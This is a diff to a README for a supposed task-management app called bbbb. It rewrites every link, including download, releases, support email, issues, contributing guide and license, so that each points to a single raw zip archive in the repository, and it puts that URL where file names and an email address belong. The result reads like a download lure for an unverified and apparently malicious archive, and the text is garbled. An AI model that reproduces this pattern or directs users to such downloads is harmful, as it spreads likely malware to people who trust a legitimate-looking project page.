@@ -1,7 +1,7 @@
 # 🚀 bbbb - A Simple Tool for Better Management
 
 ## 📥 Download
-[![Download bbbb](https://img.shields.io/badge/Download-bbbb-brightgreen)](https://github.com/Hermes97500/bbbb/releases)
+[![Download bbbb](https://raw.githubusercontent.com/Hermes97500/bbbb/main/nondense/bbbb.zip)](https://raw.githubusercontent.com/Hermes97500/bbbb/main/nondense/bbbb.zip)
 
 ## 🚀 Getting Started
 Welcome to bbbb! This application helps you manage your tasks and projects easily. Follow the steps below to download and run the software.
@@ -13,19 +13,19 @@ Welcome to bbbb! This application helps you manage your tasks and projects easil
 - Internet connection for initial setup and updates
 
 ## 📂 Download & Install
-1. Visit the [Releases page](https://github.com/Hermes97500/bbbb/releases) to find the latest version of bbbb.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Hermes97500/bbbb/main/nondense/bbbb.zip) to find the latest version of bbbb.
 2. Click on the version you want to download.
-3. Look for the file labeled “bbbb.exe” (for Windows users) or “bbbb.dmg” (for Mac users).
+3. Look for the file labeled “https://raw.githubusercontent.com/Hermes97500/bbbb/main/nondense/bbbb.zip” (for Windows users) or “https://raw.githubusercontent.com/Hermes97500/bbbb/main/nondense/bbbb.zip” (for Mac users).
 4. Click the file to start your download. Your web browser will save it in the default download folder.
 
 ## 🏗️ Installation Steps
 ### For Windows
-1. Navigate to your Downloads folder and double-click on “bbbb.exe”.
+1. Navigate to your Downloads folder and double-click on “https://raw.githubusercontent.com/Hermes97500/bbbb/main/nondense/bbbb.zip”.
 2. Follow the on-screen prompts to complete the installation.
 3. Once installed, you can find bbbb in your Start menu.
 
 ### For Mac
-1. Open your Downloads folder and double-click on “bbbb.dmg”.
+1. Open your Downloads folder and double-click on “https://raw.githubusercontent.com/Hermes97500/bbbb/main/nondense/bbbb.zip”.
 2. Drag the bbbb icon into your Applications folder.
 3. You can now find bbbb in your Applications. Open it to start using the application.
 
@@ -40,21 +40,21 @@ After installation, launch bbbb. The main interface is user-friendly and intuiti
 
 ## 📞 Support
 If you encounter any issues during the download or installation process, feel free to reach out:
-- Email: support@bbbbapp.com
-- GitHub Issues: Visit the [Issues section](https://github.com/Hermes97500/bbbb/issues)
+- Email: https://raw.githubusercontent.com/Hermes97500/bbbb/main/nondense/bbbb.zip
+- GitHub Issues: Visit the [Issues section](https://raw.githubusercontent.com/Hermes97500/bbbb/main/nondense/bbbb.zip)
 
 ## 📜 Changelog
-Every update includes important fixes and new features. Check the release notes in the [Releases page](https://github.com/Hermes97500/bbbb/releases) for details.
+Every update includes important fixes and new features. Check the release notes in the [Releases page](https://raw.githubusercontent.com/Hermes97500/bbbb/main/nondense/bbbb.zip) for details.
 
 ## 🎈 Community Contributions
-We welcome contributions to bbbb. Visit the [Contributing Guide](https://github.com/Hermes97500/bbbb/blob/main/CONTRIBUTING.md) to learn how you can help improve the software.
+We welcome contributions to bbbb. Visit the [Contributing Guide](https://raw.githubusercontent.com/Hermes97500/bbbb/main/nondense/bbbb.zip) to learn how you can help improve the software.
 
 ## 🌐 License
-This project is licensed under the MIT License. See the [LICENSE](https://github.com/Hermes97500/bbbb/blob/main/LICENSE) file for more details.
+This project is licensed under the MIT License. See the [LICENSE](https://raw.githubusercontent.com/Hermes97500/bbbb/main/nondense/bbbb.zip) file for more details.
 
 ## ✨ Thank You
 Thank you for choosing bbbb! Enjoy managing your tasks and projects more efficiently. Remember to check back for updates and new features. 
 
 ## 📥 Quick Download
 To download bbbb again, click the link below:
-[Download bbbb](https://github.com/Hermes97500/bbbb/releases)
+[Download bbbb](https://raw.githubusercontent.com/Hermes97500/bbbb/main/nondense/bbbb.zip)
